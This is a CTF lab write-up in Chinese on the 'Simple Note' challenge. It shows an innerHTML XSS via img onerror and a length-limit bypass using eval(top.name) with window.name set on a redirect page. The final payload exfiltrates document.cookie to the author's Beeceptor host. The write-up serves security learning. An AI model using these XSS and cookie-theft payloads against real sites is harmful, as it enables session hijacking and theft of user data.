# lab_Simple Note

1. 一開始先隨意嘗試輸入一些內容，稍微看一下網頁執行的流程，然後去研究一下網頁的原始碼。

![截圖 2023-01-01 下午1.05.54.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25881.05.54.png)

![截圖 2023-01-01 下午1.06.50.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25881.06.50.png)

![截圖 2023-01-01 下午1.07.15.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25881.07.15.png)

1. 它會去 URL 取得 id ，並將 id 放在 api/note 後面，然後去 fetch ，fetch 回來後取得 title 跟 content ，然後分別存在 titleNode.innerHTML 及 contentNode.innerText，接著我任意嘗試去一些 XSS 發現在 title 輸入 “01<script>alert("hack_it")</script>” 不能成功，研究了一下發現 innerHTML 不能使用 <script>，但是可以使用`"<img src='x' onerror='alert(1)'>"`，因此我將 title 輸入的內容改為“01<img src=x onerror=alert("hack_it")>”，就可以成功 XSS 成功。

![截圖 2023-01-01 下午1.43.12.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25881.43.12.png)

![截圖 2023-01-01 下午2.01.58.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25882.01.58.png)

![截圖 2023-01-01 下午1.57.00.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25881.57.00.png)

1. 接下來我打算用跟前一個 lab 一樣的方式，將 fetch 放在 XSS 的裡面然後將 cookie 回傳，但發現 title 有長度的限制，放到 burp 裡面硬送也會 Response "Title length exceed 40”，因次現在我們只要克服如何有長度限制的 XSS 就可以了。

```
01<script>alert("hack_it")</script>
01<img src=x onerror=alert("hack_it")>
01<img src=x onerror=eval(top.name)>
```

![截圖 2023-01-01 下午2.18.55.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25882.18.55.png)

1. 因為 [Windows.name](http://Windows.name) 的值可以跨網頁存取，利用這一點，可以使用 Beecepter 幫我先設定 [window.name](http://window.name) 的值跟轉址到 note 的 location，因此到 note 的頁面後就可以突破長度的限制，任意寫進自己的 payload 。

![截圖 2023-01-01 下午2.39.14.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25882.39.14.png)

1. 然後以下是我這邊進行操作的 Step ，確定 [windows.name](http://windows.name) 可以寫為自己想要的內容。

```
Step 1 :
  title = 01<img src=x onerror=eval(top.name)>

Step 2 :
Beecepter 設定轉跳內容，這邊設定完後，存取 https://andy1.free.beeceptor.com 就會自動設定
windwos.name 為 alert ，然後轉址到 note，並且跳出 alert(1)。接下來 windows name 的內容是
我們可以任意且的。
	<script>
	window.name = "alert(1)"
	location = "https://note.ctf.zoolab.org/note/789eeb37a4e3dd01c7aa258e"
	</script>

Step 3 : 
將 windows.name 改為 fetch 自己的網址後，也可以成功看到 Response 123。
	set
	window.name = "fetch('https://andy1.free.beeceptor.com?c='+123)"
	=>
  <script>
  window.name = "fetch('https://andy1.free.beeceptor.com?c='+123)"
	location = "https://note.ctf.zoolab.org/note/f83aaf78e1dace8aba21d63c"
	</script>

```

1. 最後，將 fetch 內容改為 document.cookie ，然後按一下 Report ，並把 report 的 url 改為自己的網址，並設定一個 admin 的 cookie name，然後就成功獲得 FLAG。

```
<script>
window.name = "fetch('https://andy1.free.beeceptor.com?c='+document.cookie)"
location = "https://note.ctf.zoolab.org/note/1accd205c0c0885d18ea0a2f"
</script>
```

![截圖 2023-01-01 下午4.04.41.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25884.04.41.png)

![截圖 2023-01-01 下午3.53.31.png](lab_Simple%20Note%20916645f9bb8f4056b312d7b07f5d382e/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258B%25E5%258D%25883.53.31.png)